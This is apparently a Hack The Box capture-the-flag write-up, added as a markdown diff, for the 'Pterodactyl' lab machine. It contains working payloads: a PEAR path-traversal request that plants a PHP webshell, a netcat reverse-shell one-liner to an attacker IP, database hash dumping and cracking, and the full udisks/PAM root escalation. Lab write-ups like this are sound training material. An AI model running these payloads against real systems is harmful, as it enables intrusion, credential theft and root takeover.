@@ -1,0 +1,259 @@
+---
+title: Pterodactyl
+date: '2026-02-19'
+description: 'Writeup for the Pterodactyl machine .'
+type: writeup
+platform: hackthebox
+difficulty: medium
+tags:
+  - ACTIVE-MACHINE
+  - HTB
+  - MEDIUM
+cover: /mc/images/tokyo.jpg
+---
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+Hi Guys how are you doing , i hope ur good guys , so today we gonna share the wireup of the second machine in Season on HTB
+so lets begin with a small recon with nmap
+
+## Recon
+
+```bash
+$ nmap 10.129.1.27 -sV -T5  
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-11 14:39 -0500
+Nmap scan report for pterodactyl.htb (10.129.1.27)
+Host is up (0.072s latency).
+Not shown: 981 filtered tcp ports (no-response), 15 filtered tcp ports (admin-prohibited)
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
+80/tcp   open   http       nginx 1.21.5
+443/tcp  closed https
+8080/tcp closed http-proxy
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.71 seconds
+```
+
+## Website
+
+so nothing new, just the port 80 and 22 , so we gonna see if there is something interesting in the website
+we found a changelog.txt that has interesting things
+
+```bash
+$curl http://pterodactyl.htb/changelog.txt
+MonitorLand - CHANGELOG.txt
+======================================
+
+Version 1.20.X
+
+[Added] Main Website Deployment
+--------------------------------
+- Deployed the primary landing site for MonitorLand.
+- Implemented homepage, and link for Minecraft server.
+- Integrated site styling and dark-mode as primary.
+
+[Linked] Subdomain Configuration
+--------------------------------
+- Added DNS and reverse proxy routing for play.pterodactyl.htb.
+- Configured NGINX virtual host for subdomain forwarding.
+
+[Installed] Pterodactyl Panel v1.11.10
+--------------------------------------
+- Installed Pterodactyl Panel.
+- Configured environment:
+  - PHP with required extensions.
+  - MariaDB 11.8.3 backend.
+
+[Enhanced] PHP Capabilities
+-------------------------------------
+- Enabled PHP-FPM for smoother website handling on all domains.
+- Enabled PHP-PEAR for PHP package management.
+- Added temporary PHP debugging via phpinfo()
+```
+
+so first we have the PHP-PEAR enabled , we got the phpinfo()
+
+## Vhost Discovery
+
+Also there is a panel , so we may need to find the virutal hosts tho to do that we need ffuf
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.1.27 -H "Host: FUZZ.pterodactyl.htb" -fs 145
+```
+
+using this simple commande we find that there is a subdomain named panel , so we gonna add it to /etc/hosts and start recon over this subdomain
+
+so this panel is using a software named Pterodactyl so we gonna look for this software over google and Github to see if there is any vulnebility that can get us any hint for the initial access .
+
+### CVE 2025-49132
+
+so i found that there is a vulnerability that gonna gives us a RCE to to the server the CVE is [CVE-2025-49132](https://www.exploit-db.com/exploits/52341)
+
+so i tried to understand and while looking around i found that there is a POC for it so we gonna try to use the concept as the poc did for the poc link [https://github.com/0xtensho/CVE-2025-49132-poc/blob/main/poc.py](https://github.com/0xtensho/CVE-2025-49132-poc/blob/main/poc.py)
+
+before following the poc we need to make sure that this version is vulnerable to this CVE or not so we gonna use burpsuite and this payload for this job
+
+![trying the CVE payload in pterodactyl machine](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-11-213702-1024x550.png)
+
+as we can see from this request , the version of the Panel is vulnerable so we gonna start following the poc and gain the RCE , i tried the same payload of the POC but it didnt work , so i try to figure out what is the problem by reviewing the phpinfo page , to make it work we need to add PEAR to the path , you can see the include_path in phpinfo
+
+so we gonna try first with a basic payload system('id') to make sure it works fine and after that we gonna build a webshell
+
+![inject id command in pterodactyl machine](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-11-230119.png)
+
+after injecting the payload in a php file we gonna look for this file and try to access it
+
+![find the malicious php file we create in pterodactyl machine](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-11-230200.png)
+
+so we gonna build the webshell easily just change the `id` to `$_GET['cmd']` and we got the shell
+
+```bash
+/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_GET['cmd']);?>/+/tmp/john.php
+```
+
+so to have a reverse shell we gonna use this payload after using forwarding this payload you should visit get the shell with netcat
+
+```bash
+/locales/locale.json?locale=../../../../../../tmp&namespace=john&cmd=rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/bash%20-i%202%3E%261%7Cnc%2010.10.16.XX%201234%20%3E/tmp/f
+```
+
+## First Access
+
+we set up a listener
+
+```bash
+nc -nvlp 1234
+
+listening on [any] 1234 ...
+connect to [10.10.1XX.XXX] from (UNKNOWN) [10.129.1.60] 42326
+bash: cannot set terminal process group (1214): Inappropriate ioctl for device
+bash: no job control in this shell
+wwwrun@pterodactyl:/var/www/pterodactyl/public> 
+```
+
+so in the first image there was some credentials of the database so we gonna use it now to get the users
+
+```bash
+wwwrun@pterodactyl:/var/www/pterodactyl/public> mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel panel -e "SELECT username,password From users"
+mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
+username        password
+headmonitor     $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
+phileasfogg3    $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
+```
+
+so we gonna use Hashcat to find the password , we successefully find the password of phileasfogg3 for the other user we didnt
+
+```bash
+hashcat -m 3200 -a 0 hash  /usr/share/wordlists/rockyou.txt --show
+
+$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
+```
+
+### find the User
+
+so we gonna authenticate as phileasfogg3
+
+```bash
+ssh phileasfogg3@10.11.XX.XX
+phileasfogg3@pterodactyl:~> sudo -l
+[sudo] password for phileasfogg3: 
+Matching Defaults entries for phileasfogg3 on pterodactyl:
+    always_set_home, env_reset, env_keep="LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME
+    LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS XDG_SESSION_COOKIE", !insults,
+    secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw
+
+User phileasfogg3 may run the following commands on pterodactyl:
+    (ALL) ALL
+phileasfogg3@pterodactyl:~> wget YOUR+IP:8000/linpeas.sh
+```
+
+## Priv Escalation
+
+so after uploading linpeas.sh and looking around the system , i found that the system is running with openSuse leap 15.6 and looking around with my AI assistant , i found that this version is vulnerable to this CVE 2025-6018 and CVE 2025-6019 which means we can go from this user we got now to the root just by abusing the PAM-environment and via udisk so if you wanna know more information and the steps to do that u can visit this website Qualys
+
+first we gonna create the pam_environment and setting the Values of XDG_SEAT and XDG_VTNR to seat0 and 1
+
+```bash
+phileasfogg3@pterodactyl:~> { echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > ~/.pam_environment
+```
+
+after creating the environment we gonna exit and authenticate again and see if the flag change from challenge to yes
+
+```bash
+ssh phileasfogg3@10.129.1.60
+
+phileasfogg3@pterodactyl:~> gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
+('yes',)
+```
+
+we successefuly tricked the pam_systemd into registering a full `allow_active=yes` session means physical console privileges without challenge
+
+next we gonna go to our machine and start the CVE 2025-6019 by exploiting the udisk and follow the POC .So first we gonna create an empty disk iage file to hold a copy of our malicious /bin/bash
+
+```bash
+kali$ dd if=/dev/zero of=./xfs.image bs=1M count=300
+```
+
+we format our image to XFS filesystem
+
+```bash
+kali$ mkfs.xfs ./xfs.image
+meta-data=./xfs.image            isize=512    agcount=4, agsize=19200 blks
+         =                       sectsz=512   attr=2, projid32bit=1
+         =                       crc=1        finobt=1, sparse=1, rmapbt=1
+         =                       reflink=1    bigtime=1 inobtcount=1 nrext64=1
+......
+```
+
+after that we gonna create a arbitrary directory to mount our image
+
+```bash
+mkdir ./xfs.mount
+sudo mount -t xfs ./xfs.image ./xfs.mount
+```
+
+it should be appear in the directly as a volume We gonna copy the /bin/bash or whatever sh you would like
+
+```bash
+cp /bin/bash ./xfs.mount
+we add the Suid-root to the malicious bash
+chmod 04555 ./xfs.mount/bash
+and we gonna umount the image
+umount ./xfs.mount
+```
+
+so now our xfs.image contains a malicious bash , we gonna copy it to the target machine with scp or whatever tool you want
+
+```bash
+scp ./xfs.image phileasfogg3@10.129.1.60:~
+```
+
+after that we gonna map the image to /dev/loop0 with this command
+
+```bash
+phileasfogg3@pterodactyl:~> udisksctl loop-setup --file ./xfs.image --no-user-interaction
+Mapped file ./xfs.image as /dev/loop3.
+
+phileasfogg3@pterodactyl:~> while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &
+[3] 2228
+
+phileasfogg3@pterodactyl:~> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop3 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
+Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop3: Failed to unmount '/dev/loop3' after resizing it: target is busy
+phileasfogg3@pterodactyl:~> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop3 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'\-r-sr-xr-x 1 root root 1380656 Feb 12 03:00 /tmp/blockdev.Y4BNK3/bash
+-r-sr-xr-x 1 root root 1380656 Feb 12 03:00 /tmp/blockdev.Y4BNK3/bash
+-r-sr-xr-x 1 root root 1380656 Feb 12 03:00 /tmp/blockdev.Y4BNK3/bash
+```
+
+FINALLY HOLLY SHIT , like i repeat this process like 2 hours to just this mf bash appear
+
+```bash
+phileasfogg3@pterodactyl:~> mount
+phileasfogg3@pterodactyl:~> /tmp/blockdev*/bash -p
+bash-5.3# id
+uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
+```
+
+**ROOTED**
+
+if you have any trouble to understand something let me know
